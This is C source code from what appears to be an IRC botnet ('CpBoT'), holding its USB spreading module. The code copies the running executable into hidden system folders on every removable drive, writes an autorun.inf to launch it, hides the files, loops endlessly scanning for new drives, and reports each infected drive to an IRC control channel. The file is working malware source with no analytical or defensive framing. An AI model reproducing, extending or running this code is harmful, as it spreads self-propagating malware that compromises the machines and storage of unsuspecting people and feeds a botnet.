//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//

#include "includes.h"
#include "functions.h"
#include "externs.h"

BOOL USB_InfectDrive(char *drv)
{	
	char	szFile[IRCLINE] = {0}, szTemp[IRCLINE] = {0}, *p;
	int		i;
	BOOL	ret;
	HANDLE	f;
	DWORD	d;

	lstrcat(szFile, drv);
	lstrcat(szFile, USB_STR_RECYCLER);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	lstrcat(szFile, USB_STR_REC_SUBDIR);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	lstrcat(szFile, USB_STR_DESKTOP_INI);	
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (f < (HANDLE)1) 
		return FALSE;
	if (!WriteFile(f, USB_STR_DESKTOP_DATA, sizeof(USB_STR_DESKTOP_DATA) - 1, &d, NULL))
	{
		CloseHandle(f);
		return FALSE;
	}
	CloseHandle(f);

	p = szFile + lstrlen(szFile);
	while (p[0] != '\\')
		p--;
	p++;
	*p = 0;
	lstrcat(szFile, USB_STR_FILENAME);
	GetModuleFileName(0, szTemp, sizeof(szTemp)-1);
	ret = CopyFile(szTemp, szFile, TRUE);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	
	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;
	p = szFile;
	while (p[0] != '\\')
		p++;
	p++;
	lstrcat(szTemp, USB_STR_AUTORUN_DATA1);
	lstrcat(szTemp, p);
	lstrcat(szTemp, USB_STR_AUTORUN_DATA2);
	lstrcat(szTemp, p);
	lstrcat(szTemp, USB_STR_AUTORUN_DATA3);

	for (i = 0; i < sizeof(szFile); i++)
		szFile[i] = 0;
	lstrcat(szFile, drv);
	lstrcat(szFile, USB_STR_AUTORUN_INF);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0);
	if (f < (HANDLE)1)
		return FALSE;
	if (!WriteFile(f, szTemp, lstrlen(szTemp), &d, NULL))
	{
		CloseHandle(f);
		return FALSE;
	}

	CloseHandle(f);
	return ret;
}

DWORD WINAPI USB_Spreader(LPVOID param)
{
	NTHREAD usb = *((NTHREAD *)param);
	NTHREAD *usbs = (NTHREAD *)param;
	usbs->gotinfo = TRUE;
	IRC* irc=(IRC*)usb.conn;

    char		szTemp[IRCLINE] = {0}, buff[IRCLINE];
	char 		szDrive[3];
	char		*p;
	int			i;

	szDrive[0] = ' ';
	szDrive[1] = ':';
	szDrive[2] = 0;
	
	for (;;)
	{
		Sleep(USBSLEEPTIME);

    	if (GetLogicalDriveStrings(IRCLINE - 1, szTemp)) 
    	{
        	p = szTemp;
	
        	do
        	{
				*szDrive = *p;

				if (szDrive[0] != 65 && szDrive[0] != 66 && szDrive[0] != 97 && szDrive[0] != 98)
				{
					if (GetDriveType(szDrive) == DRIVE_REMOVABLE)
					{
						if (USB_InfectDrive(szDrive))
						{
							irc->privmsg(USB_CHANNEL, ".::[Usb]::. Infected drive: %s", szDrive);
						}
					}
				}

           		while (*p++);

			} while (*p);
		}
	}
}
